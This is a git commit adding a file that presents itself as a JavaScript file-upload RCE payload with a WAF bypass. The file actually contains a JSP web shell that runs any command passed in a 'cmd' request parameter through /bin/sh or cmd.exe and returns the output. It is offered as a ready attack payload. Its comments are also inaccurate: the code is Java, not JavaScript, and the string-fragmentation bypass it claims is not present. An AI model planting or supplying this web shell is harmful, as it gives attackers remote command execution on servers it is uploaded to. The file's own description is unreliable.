053de138004acf444c36b6fb988e6de25dc3d257
Malek Abu liala <64085566+malekAbuliala@users.noreply.github.com>
2026-01-20 14:30:44 +0300

    Create code_file_upload_rce_type_bypass_WAF_lapx.js

---
+++ code_file_upload_rce_type_bypass_WAF_lapx.js
@@ -0,0 +1,21 @@
+// This codeing we will using with File Upload RCE Bug type and This file expresses the exploited File Upload RCE if server using js lang with bypass WAF ( The section follows the RCE Bug )
+<%-- Bypass: Fragmentation of runtime strings --%>
+<%@ page import="java.io.*" %>
+<%
+    String cmd = request.getParameter("cmd");
+    if (cmd != null) {
+        String[] command = {"/bin/sh", "-c", cmd}; // Linux
+        if (System.getProperty("os.name").toLowerCase().contains("win")) {
+            command = new String[]{"cmd.exe", "/c", cmd}; // Windows
+        }
+        Process p = Runtime.getRuntime().exec(command);
+        OutputStream os = p.getOutputStream();
+        InputStream in = p.getInputStream();
+        DataInputStream dis = new DataInputStream(in);
+        String disr = dis.readLine();
+        while (disr != null) {
+            out.println(disr);
+            disr = dis.readLine();
+        }
+    }
+%>
